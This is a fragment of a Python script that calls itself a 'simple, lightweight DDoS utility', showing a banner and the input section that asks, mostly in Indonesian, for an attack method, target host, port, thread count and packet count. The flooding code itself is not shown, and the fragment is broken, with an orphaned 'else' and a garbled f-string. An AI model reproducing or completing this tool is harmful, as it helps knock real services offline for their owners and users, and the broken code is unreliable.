...
███████╗██║██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝╚═╝╚═════╝░╚═════╝░░╚════╝░╚═════╝░
{RESET}Simple, lightweight {RED}DDoS {RESET}utility
Made by {YELLOW}GoldenVadim
""")
        if args.METHOD:METHOD=args.METHOD.upper()
        else:METHOD=input(RESET+f'[{GREEN}Masukan Methode ENIONSRESET}]: {GREEN}').upper()
        METHODS=['BIGENIONS','CONNECTS','CONNECTS2','BOTS','URL']
        print(RESET+" Memeriksa Methode ENIONS!..")
        if not METHOD in METHODS:
            print(RED+"Invalid method. There is available methods to use: "+", ".join([i for i in METHODS]))
            exit()
        if args.TARGET:TARGET=str(args.TARGET)
        else:TARGET=input(RESET+f'[{RED}Masukan Host Target ENIONS✓✓(IP/URL){RESET}]: {RED}')
        else:PORT=input(RESET+f'[{RED}Masukan Port Target ENIONS✓✓(PORT){RESET}]: {RED}')
        if args.THREADS:THREADS=int(args.THREADS)
        else:THREADS=int(input(RESET+f'[{CYAN}Masukan Jumlah Threads ENIONS✓✓{RESET}]: {CYAN}'))
        if args.COUNT:COUNT=int(args.COUNT)
        else:COUNT=int(input(RESET+f'[{CYAN}Masukan Jumlah Packets ENIONS✓✓✓{RESET}]: {CYAN}'))
